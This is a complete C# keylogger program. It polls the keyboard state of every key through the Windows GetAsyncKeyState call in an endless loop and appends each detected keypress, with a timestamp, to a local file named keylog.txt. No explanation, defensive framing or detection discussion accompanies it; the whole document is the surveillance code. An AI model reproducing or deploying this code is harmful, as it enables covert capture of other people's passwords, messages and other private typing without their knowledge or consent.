using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;

class KeyLogger
{
    [DllImport("User32.dll")]
    private static extern int GetAsyncKeyState(Int32 i);

    static void Main()
    {
        string filePath = "keylog.txt";
        using (StreamWriter sw = new StreamWriter(filePath, true))
        {
            while (true)
            {
                for (int i = 0; i < 255; i++)
                {
                    int keyState = GetAsyncKeyState(i);
                    if (keyState == -32767)
                    {
                        Keys key = (Keys)i;
                        sw.Write($"{DateTime.Now}: {key}\n");
                        sw.Flush();
                    }
                }
                System.Threading.Thread.Sleep(1000);
            }
        }
    }
}
